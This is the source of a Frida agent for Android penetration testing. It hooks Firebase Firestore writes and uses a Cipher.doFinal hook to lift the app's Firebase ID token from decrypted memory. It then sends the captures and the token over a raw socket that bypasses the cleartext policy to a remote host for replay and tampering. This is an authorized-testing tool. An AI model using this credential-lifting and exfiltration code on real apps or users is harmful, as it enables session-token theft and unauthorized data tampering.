/*
 * firestore_agent.js — Frida agent for Firestore Workbench.
 *
 * Hooks an Android app's Firebase Firestore SDK and streams every document
 * write (set / update / add) to the Workbench, together with the project id and
 * the app's current Firebase ID token. You then replay / tamper those requests
 * from the Workbench GUI over the Firestore REST API.
 *
 * Designed to be target-agnostic:
 *   - Firestore classes are discovered by METHOD SIGNATURE, so it works on
 *     release/obfuscated (R8) builds without knowing the renamed class names.
 *   - The ID token is lifted from memory via the decryption call (Firebase
 *     persists it encrypted with a Keystore key), so no password is needed.
 *   - Captures are sent over a raw socket, bypassing the app's cleartext-HTTP
 *     (NetworkSecurityPolicy) restriction.
 *
 * Requirements: rooted device + frida-server, app using the native Firebase
 * Firestore SDK (native Android or Flutter+Firebase).
 *
 * Usage:
 *   1. Start the Workbench:  python firestore_workbench.py --host 0.0.0.0
 *   2. Set WB_HOST below to this machine's LAN IP.
 *   3. frida -U -f <package> -l firestore_agent.js
 *   4. Use the app — writes appear in the Workbench.
 *
 * Only use against apps you are authorized to test.
 */

'use strict';

// ====== CONFIG ============================================================
var WB_HOST = '127.0.0.1';   // IP of the machine running the Workbench (the device must be able to reach it)
var WB_PORT = 8799;          // Workbench port
var WB_PATH = '/api/capture';
var DEFAULT_PROJECT = '';    // optional fallback projectId; '' = auto-detect only
// ==========================================================================

function log(m) { console.log('[fsagent] ' + m); }

var PROJECT = null, TOKEN = null, UID = null;
var pending = [];   // JSON strings queued for the background poster

Java.perform(function () {

  // ---- background HTTP poster (raw socket; not subject to cleartext policy) ----
  var Poster = Java.registerClass({
    name: 'wb.FsPoster',
    implements: [Java.use('java.lang.Runnable')],
    methods: {
      run: function () {
        var body = pending.shift();
        if (body === undefined) return;
        var sock = null;
        try {
          var bodyBytes = Java.use('java.lang.String').$new(body).getBytes('UTF-8');
          var req = 'POST ' + WB_PATH + ' HTTP/1.1\r\n' +
                    'Host: ' + WB_HOST + ':' + WB_PORT + '\r\n' +
                    'Content-Type: application/json\r\n' +
                    'Content-Length: ' + bodyBytes.length + '\r\n' +
                    'Connection: close\r\n\r\n';
          sock = Java.use('java.net.Socket').$new(WB_HOST, WB_PORT);
          var os = sock.getOutputStream();
          os.write(Java.use('java.lang.String').$new(req).getBytes('US-ASCII'));
          os.write(bodyBytes);
          os.flush();
          sock.close();
        } catch (e) {
          try { if (sock) sock.close(); } catch (e2) {}
        }
      }
    }
  });
  function post(obj) {
    try { pending.push(JSON.stringify(obj)); Java.use('java.lang.Thread').$new(Poster.$new()).start(); } catch (e) {}
  }

  // ---- project id ----------------------------------------------------------
  function refreshProject() {
    try {
      var opts = Java.use('com.google.firebase.FirebaseApp').getInstance().getOptions();
      var pid = opts.getProjectId();
      if (pid) { PROJECT = pid.toString(); return; }
      // fallback: derive from storage bucket "<project>.appspot.com" / ".firebasestorage.app"
      try { var sb = opts.getStorageBucket(); if (sb) { PROJECT = sb.toString().replace(/\.(appspot\.com|firebasestorage\.app)$/, ''); return; } } catch (e) {}
    } catch (e) {}
    if (!PROJECT && DEFAULT_PROJECT) PROJECT = DEFAULT_PROJECT;
  }

  // ---- Java object -> plain JS (the written document data) ------------------
  var JBool = Java.use('java.lang.Boolean'), JNum = Java.use('java.lang.Number'),
      JStr = Java.use('java.lang.String'), JMap = Java.use('java.util.Map'), JList = Java.use('java.util.List');
  function isI(cls, o) { try { return cls.class.isInstance(o); } catch (e) { return false; } }
  function toJs(o) {
    if (o === null || o === undefined) return null;
    try {
      if (isI(JBool, o)) return Java.cast(o, JBool).booleanValue();
      if (isI(JNum, o)) return Java.cast(o, JNum).doubleValue();
      if (isI(JStr, o)) return Java.cast(o, JStr).toString();
      if (isI(JMap, o)) { var m = Java.cast(o, JMap), out = {}, it = m.keySet().iterator();
        while (it.hasNext()) { var k = it.next(); out[k.toString()] = toJs(m.get(k)); } return out; }
      if (isI(JList, o)) { var l = Java.cast(o, JList), a = []; for (var i = 0; i < l.size(); i++) a.push(toJs(l.get(i))); return a; }
      return o.toString();
    } catch (e) { try { return o.toString(); } catch (e2) { return '<?>'; } }
  }

  // ---- discover Firestore classes by signature -----------------------------
  var FF;
  try { FF = Java.use('com.google.firebase.firestore.FirebaseFirestore'); }
  catch (e) { log('FirebaseFirestore not found — not a Firestore app? ' + e); return; }

  function methodsOf(cn) { try { return Java.use(cn).class.getDeclaredMethods(); } catch (e) { return []; } }
  function sig(m) { return m.getParameterTypes().map(function (p) { return p.getName(); }); }

  var singleStringReturns = [];
  FF.class.getDeclaredMethods().forEach(function (m) {
    var ps = sig(m);
    if (ps.length === 1 && ps[0] === 'java.lang.String') singleStringReturns.push(m.getReturnType().getName());
  });

  var docRefName = null, collRefName = null;
  // DocumentReference is uniquely identified by update(Map)->Task or set(Object, SetOptions)->Task.
  // (CollectionReference.add(Object) also returns a Task, so a naive "(Object)->Task" check
  // misidentifies it — which is exactly what happened on a non-obfuscated build.)
  singleStringReturns.forEach(function (cn) {
    var hasUpdate = false, hasSet2 = false;
    methodsOf(cn).forEach(function (m) {
      var ps = sig(m), rt = m.getReturnType().getName();
      if (ps.length === 1 && ps[0] === 'java.util.Map' && rt.indexOf('Task') >= 0) hasUpdate = true;
      if (ps.length === 2 && ps[0] === 'java.lang.Object' && rt.indexOf('Task') >= 0) hasSet2 = true;
    });
    if ((hasUpdate || hasSet2) && !docRefName) docRefName = cn;
  });
  // CollectionReference: a single-String-return class (not DocumentReference) with add(Object)->Task.
  singleStringReturns.forEach(function (cn) {
    if (cn === docRefName || collRefName) return;
    var hasAdd = methodsOf(cn).some(function (m) {
      var ps = sig(m), rt = m.getReturnType().getName();
      return ps.length === 1 && ps[0] === 'java.lang.Object' && rt.indexOf('Task') >= 0;
    });
    if (hasAdd) collRefName = cn;
  });
  log('DocumentReference=' + docRefName + ' CollectionReference=' + collRefName);
  if (!docRefName) { log('could not resolve DocumentReference — aborting'); return; }

  // no-arg String getters -> used to recover the document/collection path
  function stringGetters(cn) {
    var g = [];
    methodsOf(cn).forEach(function (m) { if (sig(m).length === 0 && m.getReturnType().getName() === 'java.lang.String') g.push(m.getName()); });
    return g;
  }
  var drPathGetters = stringGetters(docRefName);
  function pathOf(self, getters) {
    var best = '';
    for (var i = 0; i < getters.length; i++) {
      try { var v = self[getters[i]](); if (v) { if (v.indexOf('/') >= 0 && v.length > best.length) best = v; else if (!best) best = v; } } catch (e) {}
    }
    return best;
  }

  // ---- hook DocumentReference set / update ---------------------------------
  var DR = Java.use(docRefName), hooks = 0;
  methodsOf(docRefName).forEach(function (m) {
    var name = m.getName(), ps = sig(m), rt = m.getReturnType().getName(), op = null;
    if (rt.indexOf('Task') >= 0 && ps.length >= 1 && ps[0] === 'java.lang.Object') op = 'set';
    else if (rt.indexOf('Task') >= 0 && ps.length === 1 && ps[0] === 'java.util.Map') op = 'update';
    if (!op) return;
    try {
      var ov = DR[name].overload.apply(DR[name], ps);
      ov.implementation = function () {
        try {
          post({ op: op, path: pathOf(this, drPathGetters), data: toJs(arguments[0]), project: PROJECT, token: TOKEN, uid: UID, source: 'app' });
          log(op + ' ' + pathOf(this, drPathGetters));
        } catch (e) {}
        return ov.apply(this, arguments);
      };
      hooks++;
    } catch (e) {}
  });

  // ---- hook CollectionReference add ----------------------------------------
  if (collRefName) {
    try {
      var CR = Java.use(collRefName), crPathGetters = stringGetters(collRefName);
      methodsOf(collRefName).forEach(function (m) {
        if (sig(m).length === 1 && sig(m)[0] === 'java.lang.Object') {
          try {
            var ov = CR[m.getName()].overload('java.lang.Object');
            ov.implementation = function (d) {
              try { var cp = pathOf(this, crPathGetters); post({ op: 'add', collection: cp, path: cp, data: toJs(d), project: PROJECT, token: TOKEN, uid: UID, source: 'app' }); log('add ' + cp); } catch (e) {}
              return ov.apply(this, arguments);
            };
            hooks++;
          } catch (e) {}
        }
      });
    } catch (e) {}
  }

  // ---- token capture -------------------------------------------------------
  // Firebase persists the ID token encrypted (Keystore key) and the SDK/gRPC is
  // shaded+obfuscated, so the only reliable plaintext is the decryption output.
  // Hook Cipher.doFinal and lift the JWT out of the decrypted user blob.
  function installCipherHook() {
    try {
      var Cipher = Java.use('javax.crypto.Cipher'), S = Java.use('java.lang.String');
      Cipher.doFinal.overloads.forEach(function (ov) {
        try {
          ov.implementation = function () {
            var ret = ov.apply(this, arguments);
            try {
              if (ret && typeof ret === 'object' && typeof ret.length === 'number' && ret.length > 40) {
                var s = '' + S.$new(ret, 'UTF-8');
                if (s.indexOf('eyJ') >= 0) {
                  var m = s.match(/eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/);
                  if (m && m[0] && m[0] !== TOKEN) {
                    TOKEN = m[0];
                    log('token captured (' + m[0].length + ' chars)');
                    post({ op: 'auth', path: '(token captured)', data: null, token: TOKEN, project: PROJECT, uid: UID, source: 'auth' });
                  }
                }
              }
            } catch (e) {}
            return ret;
          };
        } catch (e) {}
      });
    } catch (e) { log('cipher hook failed: ' + e); }
  }

  refreshProject();
  setTimeout(refreshProject, 3000);
  installCipherHook();
  log('ready — ' + hooks + ' write hooks, project=' + PROJECT + ', posting to http://' + WB_HOST + ':' + WB_PORT + WB_PATH);
});
